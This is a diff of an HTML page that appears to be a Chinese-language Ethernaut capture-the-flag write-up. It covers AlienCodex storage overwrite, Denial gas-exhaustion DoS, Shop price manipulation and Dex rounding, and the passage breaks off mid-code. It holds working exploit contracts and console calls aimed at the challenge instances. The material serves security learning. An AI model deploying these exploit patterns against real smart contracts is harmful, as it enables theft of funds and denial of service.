+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">record</span>(<span class="hljs-params">bytes32 _content</span>) <span class="hljs-keyword">public</span> contacted {
+        codex.<span class="hljs-title function_">push</span>(_content);
     }
 
-    function retract() public contacted {
-        codex.length--;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">retract</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> contacted {
+        codex.<span class="hljs-property">length</span>--;
     }
 
-    function revise(uint256 i, bytes32 _content) public contacted {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">revise</span>(<span class="hljs-params">uint256 i, bytes32 _content</span>) <span class="hljs-keyword">public</span> contacted {
         codex[i] = _content;
     }
 }
@@ -1120,59 +1120,59 @@ contract AlienCodex is Ownable {
 </tbody></table>
 <p> 内存绕回类比  ,要找到slot[0]在动态数组下标要满足</p>
 <pre><code class="language-solidity">找到某个 i，使得：
-keccak256(1) + i == 0 （mod 2^256）    （在 uint256 下取模 2^256）
+<span class="hljs-title function_">keccak256</span>(<span class="hljs-number">1</span>) + i == <span class="hljs-number">0</span> （mod <span class="hljs-number">2</span>^<span class="hljs-number">256</span>）    （在 uint256 下取模 <span class="hljs-number">2</span>^<span class="hljs-number">256</span>）
 那么
-i=-arrayBase(mod 2^256) =(2^256 - arrayBase)
+i=-<span class="hljs-title function_">arrayBase</span>(mod <span class="hljs-number">2</span>^<span class="hljs-number">256</span>) =(<span class="hljs-number">2</span>^<span class="hljs-number">256</span> - arrayBase)
 </code></pre>
-<pre><code class="language-solidity">// 相当于计算 keccak256(slot 1)
-let array_base = web3.utils.soliditySha3({ t: &#39;uint256&#39;, v: 1 });
-// array_base 是 codex[0] 所在的 storage slot
+<pre><code class="language-solidity"><span class="hljs-comment">// 相当于计算 keccak256(slot 1)</span>
+<span class="hljs-keyword">let</span> array_base = web3.<span class="hljs-property">utils</span>.<span class="hljs-title function_">soliditySha3</span>({ <span class="hljs-attr">t</span>: <span class="hljs-string">&#x27;uint256&#x27;</span>, <span class="hljs-attr">v</span>: <span class="hljs-number">1</span> });
+<span class="hljs-comment">// array_base 是 codex[0] 所在的 storage slot</span>
 
-//let target_idx = (2^256 - arrayBase)
-let arrayBase = BigInt(array_base); // array_base 是 &quot;0x...&quot; 字符串
-let maxUint = (1n &lt;&lt; 256n) - 1n; // 2^256 - 1
-let targetIdx = maxUint - arrayBase + 1n;
+<span class="hljs-comment">//let target_idx = (2^256 - arrayBase)</span>
+<span class="hljs-keyword">let</span> arrayBase = <span class="hljs-title class_">BigInt</span>(array_base); <span class="hljs-comment">// array_base 是 &quot;0x...&quot; 字符串</span>
+<span class="hljs-keyword">let</span> maxUint = (<span class="hljs-number">1n</span> &lt;&lt; <span class="hljs-number">256n</span>) - <span class="hljs-number">1n</span>; <span class="hljs-comment">// 2^256 - 1</span>
+<span class="hljs-keyword">let</span> targetIdx = maxUint - arrayBase + <span class="hljs-number">1n</span>;
 
-//targetIdx
-//35707666377435648211887908874984608119992236509074197713628505308453184860938n
-//await contract.revise(35707666377435648211887908874984608119992236509074197713628505308453184860938n,&#39;0x000000000000000000000001de3d99ec73f3ce95f0634424245ed68b01ebd2a2&#39;)
-//{tx: &#39;0x04289f8d8dcb3fd329ec07fa60515053bbb39538f6be83bd09024e28d1328ea8&#39;, receipt: {…}, logs: Array(0)}
-//await contract.owner()
-//&#39;0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2&#39;
+<span class="hljs-comment">//targetIdx</span>
+<span class="hljs-comment">//35707666377435648211887908874984608119992236509074197713628505308453184860938n</span>
+<span class="hljs-comment">//await contract.revise(35707666377435648211887908874984608119992236509074197713628505308453184860938n,&#x27;0x000000000000000000000001de3d99ec73f3ce95f0634424245ed68b01ebd2a2&#x27;)</span>
+<span class="hljs-comment">//{tx: &#x27;0x04289f8d8dcb3fd329ec07fa60515053bbb39538f6be83bd09024e28d1328ea8&#x27;, receipt: {…}, logs: Array(0)}</span>
+<span class="hljs-comment">//await contract.owner()</span>
+<span class="hljs-comment">//&#x27;0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2&#x27;</span>
 </code></pre>
 <h1>denial call的回调机制+dos</h1><p>这是一个简单的钱包，资金会随着时间推移逐步存入。您可以通过成为提现partner来逐步提取资金。</p>
 <p>如果当所有者调用时，你能阻止他们提取资金<code>withdraw()</code> （当合约中还有资金，且交易金额为 100 万 gas 或更少时），你就能赢得这一关。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Denial {
-    address public partner; // withdrawal partner - pay the gas, split the withdraw
-    address public constant owner = address(0xA9E);
+contract <span class="hljs-title class_">Denial</span> {
+    address <span class="hljs-keyword">public</span> partner; <span class="hljs-comment">// withdrawal partner - pay the gas, split the withdraw</span>
+    address <span class="hljs-keyword">public</span> constant owner = <span class="hljs-title function_">address</span>(<span class="hljs-number">0xA9E</span>);
     uint256 timeLastWithdrawn;
-    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) withdrawPartnerBalances; <span class="hljs-comment">// keep track of partners balances</span>
 
-    function setWithdrawPartner(address _partner) public {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setWithdrawPartner</span>(<span class="hljs-params">address _partner</span>) <span class="hljs-keyword">public</span> {
         partner = _partner;
     }
 
-    // withdraw 1% to recipient and 1% to owner
-    function withdraw() public {
-        uint256 amountToSend = address(this).balance / 100;
-        // perform a call without checking return
-        // The recipient can revert, the owner will still get their share
-        partner.call{value: amountToSend}(&quot;&quot;);
-        payable(owner).transfer(amountToSend);
-        // keep track of last withdrawal time
-        timeLastWithdrawn = block.timestamp;
+    <span class="hljs-comment">// withdraw 1% to recipient and 1% to owner</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+        uint256 amountToSend = <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> / <span class="hljs-number">100</span>;
+        <span class="hljs-comment">// perform a call without checking return</span>
+        <span class="hljs-comment">// The recipient can revert, the owner will still get their share</span>
+        partner.<span class="hljs-property">call</span>{<span class="hljs-attr">value</span>: amountToSend}(<span class="hljs-string">&quot;&quot;</span>);
+        <span class="hljs-title function_">payable</span>(owner).<span class="hljs-title function_">transfer</span>(amountToSend);
+        <span class="hljs-comment">// keep track of last withdrawal time</span>
+        timeLastWithdrawn = block.<span class="hljs-property">timestamp</span>;
         withdrawPartnerBalances[partner] += amountToSend;
     }
 
-    // allow deposit of funds
-    receive() external payable {}
+    <span class="hljs-comment">// allow deposit of funds</span>
+    <span class="hljs-title function_">receive</span>() external payable {}
 
-    // convenience function
-    function contractBalance() public view returns (uint256) {
-        return address(this).balance;
+    <span class="hljs-comment">// convenience function</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">contractBalance</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+        <span class="hljs-keyword">return</span> <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span>;
     }
 }
 </code></pre>
@@ -1185,8 +1185,8 @@ contract Denial {
 <li>使用 <code>send</code>, <code>transfer</code>, 或 <code>call{value: X}(&quot;&quot;)</code></li>
 </ul>
 <p>示例：</p>
-<pre><code class="language-plain">receive() external payable {
-    // 自动触发：收到 ETH 时执行
+<pre><code class="language-plain"><span class="hljs-title function_">receive</span>() external payable {
+    <span class="hljs-comment">// 自动触发：收到 ETH 时执行</span>
 }
 </code></pre>
 <hr>
@@ -1197,8 +1197,8 @@ contract Denial {
 <li>发送 ETH，但没有 receive() 函数时</li>
 </ul>
 <p>示例：</p>
-<pre><code class="language-plain">fallback() external payable {
-    // 收到未知调用或带 data 的 ETH 时执行
+<pre><code class="language-plain"><span class="hljs-title function_">fallback</span>() external payable {
+    <span class="hljs-comment">// 收到未知调用或带 data 的 ETH 时执行</span>
 }
 </code></pre>
 <h2 id="section-6">exp</h2><h3 id="section-7">错误的思路</h3><p>想到利用回调机制构建recive\fallback恶意重入，进行不断取钱</p>
@@ -1207,10 +1207,10 @@ contract Denial {
 <hr>
 <p>🔥 先看 Denial 的 withdraw 源码（关键）</p>
 <p>Denial（以太航员第 20 关）的 withdraw 大概这样（标准 Ethernaut 版）：</p>
-<pre><code class="language-plain">function withdraw() public {
-    uint amountToSend = address(this).balance / 100;
-    partner.call{value: amountToSend}(&quot;&quot;);
-    owner.transfer(amountToSend);
+<pre><code class="language-plain"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+    uint amountToSend = <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> / <span class="hljs-number">100</span>;
+    partner.<span class="hljs-property">call</span>{<span class="hljs-attr">value</span>: amountToSend}(<span class="hljs-string">&quot;&quot;</span>);
+    owner.<span class="hljs-title function_">transfer</span>(amountToSend);
 }
 </code></pre>
 <p>重要特征：</p>
@@ -1249,10 +1249,10 @@ contract Denial {
 </ul>
 <p>你最多能拿走“剩余余额的 1%”，没有利用价值。</p>
 <h3 id="section-8">✅ 为什么在 Denial 必须保留 receive？</h3><p>Denial 合约的 withdraw() 逻辑（简化版）是：</p>
-<pre><code class="language-plain">function withdraw() public {
-    uint amount = address(this).balance / 100;
-    withdrawPartner.call{value: amount}(&quot;&quot;);   // 关键点
-    owner.transfer(amount);
+<pre><code class="language-plain"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+    uint amount = <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span> / <span class="hljs-number">100</span>;
+    withdrawPartner.<span class="hljs-property">call</span>{<span class="hljs-attr">value</span>: amount}(<span class="hljs-string">&quot;&quot;</span>);   <span class="hljs-comment">// 关键点</span>
+    owner.<span class="hljs-title function_">transfer</span>(amount);
 }
 </code></pre>
 <p>核心是：</p>
@@ -1282,190 +1282,190 @@ contract Denial {
 <li>withdraw 第二步 <code>owner.transfer(amount)</code> 永远执行不到</li>
 <li>owner 永远无法从合约取钱</li>
 </ul>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-interface IVictim {
-    function setWithdrawPartner(address) external;
-    function withdraw() external;
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IVictim</span> {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setWithdrawPartner</span>(<span class="hljs-params">address</span>) external;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params"></span>) external;
 }
 
-contract Attacker {
-    IVictim public victim;
-    constructor() {
-        victim=IVictim(0x4A7Ccfdd2B29A0cFA1644aFa8e2ACBC8ce2e76d1);
-        victim.setWithdrawPartner(address(this));
+contract <span class="hljs-title class_">Attacker</span> {
+    <span class="hljs-title class_">IVictim</span> <span class="hljs-keyword">public</span> victim;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
+        victim=<span class="hljs-title class_">IVictim</span>(<span class="hljs-number">0x4A7Ccfdd2B29A0cFA1644aFa8e2ACBC8ce2e76d1</span>);
+        victim.<span class="hljs-title function_">setWithdrawPartner</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>));
     }
 
-    // 发起攻击
-    function attack() external {
-        victim.withdraw();
+    <span class="hljs-comment">// 发起攻击</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>) external {
+        victim.<span class="hljs-title function_">withdraw</span>();
     }
 
-    // 核心：卡死 partner.call
-    receive() external payable {
-        while (true) {}   // 或 assert(false);
+    <span class="hljs-comment">// 核心：卡死 partner.call</span>
+    <span class="hljs-title function_">receive</span>() external payable {
+        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {}   <span class="hljs-comment">// 或 assert(false);</span>
     }
 }
 </code></pre>
-<h1>shop</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<h1>shop</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-interface IBuyer {
-  function price() external view returns (uint256);
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IBuyer</span> {
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">price</span>(<span class="hljs-params"></span>) external view <span class="hljs-title function_">returns</span> (uint256);
 }
 
-contract Shop {
-  uint256 public price = 100;
-  bool public isSold;
+contract <span class="hljs-title class_">Shop</span> {
+  uint256 <span class="hljs-keyword">public</span> price = <span class="hljs-number">100</span>;
+  bool <span class="hljs-keyword">public</span> isSold;
 
-  function buy() public {
-    IBuyer _buyer = IBuyer(msg.sender);
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+    <span class="hljs-title class_">IBuyer</span> _buyer = <span class="hljs-title class_">IBuyer</span>(msg.<span class="hljs-property">sender</span>);
 
-    if (_buyer.price() &gt;= price &amp;&amp; !isSold) {
-      isSold = true;
-      price = _buyer.price();
+    <span class="hljs-keyword">if</span> (_buyer.<span class="hljs-title function_">price</span>() &gt;= price &amp;&amp; !isSold) {
+      isSold = <span class="hljs-literal">true</span>;
+      price = _buyer.<span class="hljs-title function_">price</span>();
     }
   }
 }
 </code></pre>
 <p>IBuyer 就是一个<strong>回调接口（callback interface）</strong>，要求调用 Shop 的人（msg.sender）必须能实现一个：</p>
-<pre><code class="language-plain">function price() external view returns (uint256);
+<pre><code class="language-plain"><span class="hljs-keyword">function</span> <span class="hljs-title function_">price</span>(<span class="hljs-params"></span>) external view <span class="hljs-title function_">returns</span> (uint256);
 </code></pre>
 <p>Shop 调用者必须满足这个接口，不然无法作为 buyer。</p>
 <p>Shop 调用 <code>price()</code> 两次，可以让这两个回调返回不同的值。  </p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-interface IShop {
-    function isSold() external view returns (bool);
-    function buy() external;
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IShop</span> {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isSold</span>(<span class="hljs-params"></span>) external view <span class="hljs-title function_">returns</span> (bool);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params"></span>) external;
 }
 
-contract Hack {
-    IShop public shop;
+contract <span class="hljs-title class_">Hack</span> {
+    <span class="hljs-title class_">IShop</span> <span class="hljs-keyword">public</span> shop;
 
-    constructor() {
-        shop = IShop(0xFC852F497D986750D23BC063606C0A6e8ec059Ba);
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
+        shop = <span class="hljs-title class_">IShop</span>(<span class="hljs-number">0xFC852F497D986750D23BC063606C0A6e8ec059Ba</span>);
     }
 
-    function price() external view returns (uint256) {
-        if (shop.isSold()) {
-            return 1;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">price</span>(<span class="hljs-params"></span>) external view <span class="hljs-title function_">returns</span> (uint256) {
+        <span class="hljs-keyword">if</span> (shop.<span class="hljs-title function_">isSold</span>()) {
+            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
         }
-        return 100;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>;
     }
 
-    function attack() external {
-        shop.buy();
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>) external {
+        shop.<span class="hljs-title function_">buy</span>();
     }
 }
 </code></pre>
 <h1>dex ERC20 evm无浮点数的利用向下取整</h1><p>你将初始获得10个<code>token1</code>和10个<code>token2</code>。去中心化交易所（DEX）合约初始拥有每种代币各100个。如果你能设法从合约中耗尽2个代币中至少1个的全部数量，并让合约报告资产的“不良”价格，你就能在这一关卡取得成功。</p>
 <p>通常情况下，当你用ERC20代币进行兑换时，必须<code>approve</code>合约代表你花费你的代币。为了与游戏的语法保持一致，我们刚刚在合约本身中添加了<code>approve</code>方法。因此，你可以放心使用<code>contract.approve(contract.address, &lt;uint amount&gt;)</code>，而不必直接调用代币，它会自动按所需数量授权花费这两种代币。除此之外，你可以忽略<code>SwappableToken</code>合约。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
-import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
-import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span>;
 
-contract Dex is Ownable {
-    address public token1;
-    address public token2;
+contract <span class="hljs-title class_">Dex</span> is <span class="hljs-title class_">Ownable</span> {
+    address <span class="hljs-keyword">public</span> token1;
+    address <span class="hljs-keyword">public</span> token2;
 
-    constructor() {}
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {}
 
-    function setTokens(address _token1, address _token2) public onlyOwner {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setTokens</span>(<span class="hljs-params">address _token1, address _token2</span>) <span class="hljs-keyword">public</span> onlyOwner {
         token1 = _token1;
         token2 = _token2;
     }
 
-    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
-        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">addLiquidity</span>(<span class="hljs-params">address token_address, uint256 amount</span>) <span class="hljs-keyword">public</span> onlyOwner {
+        <span class="hljs-title class_">IERC20</span>(token_address).<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);
     }
 
-    function swap(address from, address to, uint256 amount) public {
-        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);
-        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);
-        uint256 swapAmount = getSwapPrice(from, to, amount);
-        IERC20(from).transferFrom(msg.sender, address(this), amount);
-        IERC20(to).approve(address(this), swapAmount);
-        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">swap</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, address to, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>((<span class="hljs-keyword">from</span> == token1 &amp;&amp; to == token2) || (<span class="hljs-keyword">from</span> == token2 &amp;&amp; to == token1), <span class="hljs-string">&quot;Invalid tokens&quot;</span>);
+        <span class="hljs-built_in">require</span>(<span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(msg.<span class="hljs-property">sender</span>) &gt;= amount, <span class="hljs-string">&quot;Not enough to swap&quot;</span>);
+        uint256 swapAmount = <span class="hljs-title function_">getSwapPrice</span>(<span class="hljs-keyword">from</span>, to, amount);
+        <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);
+        <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">approve</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), swapAmount);
+        <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">transferFrom</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), msg.<span class="hljs-property">sender</span>, swapAmount);
     }
 
-    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
-        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">getSwapPrice</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, address to, uint256 amount</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+        <span class="hljs-keyword">return</span> ((amount * <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>))) / <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>)));
     }
 
-    function approve(address spender, uint256 amount) public {
-        SwappableToken(token1).approve(msg.sender, spender, amount);
-        SwappableToken(token2).approve(msg.sender, spender, amount);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">approve</span>(<span class="hljs-params">address spender, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-title class_">SwappableToken</span>(token1).<span class="hljs-title function_">approve</span>(msg.<span class="hljs-property">sender</span>, spender, amount);
+        <span class="hljs-title class_">SwappableToken</span>(token2).<span class="hljs-title function_">approve</span>(msg.<span class="hljs-property">sender</span>, spender, amount);
     }
 
-    function balanceOf(address token, address account) public view returns (uint256) {
-        return IERC20(token).balanceOf(account);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address token, address account</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
+        <span class="hljs-keyword">return</span> <span class="hljs-title class_">IERC20</span>(token).<span class="hljs-title function_">balanceOf</span>(account);
     }
 }
 
-contract SwappableToken is ERC20 {
-    address private _dex;
+contract <span class="hljs-title class_">SwappableToken</span> is <span class="hljs-title class_">ERC20</span> {
+    address <span class="hljs-keyword">private</span> _dex;
 
-    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
-        ERC20(name, symbol)
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address dexInstance, <span class="hljs-built_in">string</span> memory name, <span class="hljs-built_in">string</span> memory <span class="hljs-built_in">symbol</span>, uint256 initialSupply</span>)
+        <span class="hljs-title class_">ERC20</span>(name, <span class="hljs-built_in">symbol</span>)
     {
-        _mint(msg.sender, initialSupply);
+        <span class="hljs-title function_">_mint</span>(msg.<span class="hljs-property">sender</span>, initialSupply);
         _dex = dexInstance;
     }
 
-    function approve(address owner, address spender, uint256 amount) public {
-        require(owner != _dex, &quot;InvalidApprover&quot;);
-        super._approve(owner, spender, amount);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">approve</span>(<span class="hljs-params">address owner, address spender, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>(owner != _dex, <span class="hljs-string">&quot;InvalidApprover&quot;</span>);
+        <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">_approve</span>(owner, spender, amount);
     }
 }
 </code></pre>
 <p>基本信息</p>
-<pre><code class="language-solidity">await contract.address
-&#39;0x70E074615d19AFabc2164Ef9dBF7B65889BE5cEA&#39;
+<pre><code class="language-solidity"><span class="hljs-keyword">await</span> contract.<span class="hljs-property">address</span>
+<span class="hljs-string">&#x27;0x70E074615d19AFabc2164Ef9dBF7B65889BE5cEA&#x27;</span>
 
-await contract.owner()
-&#39;0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F&#39;
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">owner</span>()
+<span class="hljs-string">&#x27;0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F&#x27;</span>
 
-await contract.token1()
-&#39;0xcf8Fb69f4aB47E766852e1E7eb6Ff866dFA77253&#39;
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">token1</span>()
+<span class="hljs-string">&#x27;0xcf8Fb69f4aB47E766852e1E7eb6Ff866dFA77253&#x27;</span>
 
-await contract.token2()
-&#39;0xb1Ff256Ff3F2dfD6FB4cd2E0074db081068EA027&#39;
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">token2</span>()
+<span class="hljs-string">&#x27;0xb1Ff256Ff3F2dfD6FB4cd2E0074db081068EA027&#x27;</span>
 
 控制台创建好变量,可以直接变量名查看地址
-const token1addr = await contract.token1()
-const token2addr = await contract.token2()
+<span class="hljs-keyword">const</span> token1addr = <span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">token1</span>()
+<span class="hljs-keyword">const</span> token2addr = <span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">token2</span>()
 
-我们初始有各10代币
-await contract.balanceOf(token1addr,player)
-i {negative: 0, words: Array(2), length: 1, red: null}
-(2) [10, 空白]
+我们初始有各<span class="hljs-number">10</span>代币
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">balanceOf</span>(token1addr,player)
+i {<span class="hljs-attr">negative</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">words</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">2</span>), <span class="hljs-attr">length</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">red</span>: <span class="hljs-literal">null</span>}
+(<span class="hljs-number">2</span>) [<span class="hljs-number">10</span>, 空白]
 
-await contract.balanceOf(token2addr,player)
-i {negative: 0, words: Array(2), length: 1, red: null}
-(2) [10, 空白]
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">balanceOf</span>(token2addr,player)
+i {<span class="hljs-attr">negative</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">words</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">2</span>), <span class="hljs-attr">length</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">red</span>: <span class="hljs-literal">null</span>}
+(<span class="hljs-number">2</span>) [<span class="hljs-number">10</span>, 空白]
 </code></pre>
 <p>漏洞点如下，getSwapPrice函数计算方式</p>
 <p> 要用 <code>amount</code> 个 <code>from</code> 代币来换多少 <code>to</code> 代币，但evm没有浮点数，所以小数点向下取整为0</p>
-<pre><code class="language-solidity">    function swap(address from, address to, uint256 amount) public {
-        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);
-        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);
-        uint256 swapAmount = getSwapPrice(from, to, amount);
-        IERC20(from).transferFrom(msg.sender, address(this), amount);
-        IERC20(to).approve(address(this), swapAmount);
-        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+<pre><code class="language-solidity">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">swap</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, address to, uint256 amount</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>((<span class="hljs-keyword">from</span> == token1 &amp;&amp; to == token2) || (<span class="hljs-keyword">from</span> == token2 &amp;&amp; to == token1), <span class="hljs-string">&quot;Invalid tokens&quot;</span>);
+        <span class="hljs-built_in">require</span>(<span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">balanceOf</span>(msg.<span class="hljs-property">sender</span>) &gt;= amount, <span class="hljs-string">&quot;Not enough to swap&quot;</span>);
+        uint256 swapAmount = <span class="hljs-title function_">getSwapPrice</span>(<span class="hljs-keyword">from</span>, to, amount);
+        <span class="hljs-title class_">IERC20</span>(<span class="hljs-keyword">from</span>).<span class="hljs-title function_">transferFrom</span>(msg.<span class="hljs-property">sender</span>, <span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), amount);
+        <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">approve</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), swapAmount);
+        <span class="hljs-title class_">IERC20</span>(to).<span class="hljs-title function_">transferFrom</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>), msg.<span class="hljs-property">sender</span>, swapAmount);
     }
 
-  function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
-        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">getSwapPrice</span>(<span class="hljs-params">address <span class="hljs-keyword">from</span>, address to, uint256 amount</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256) {
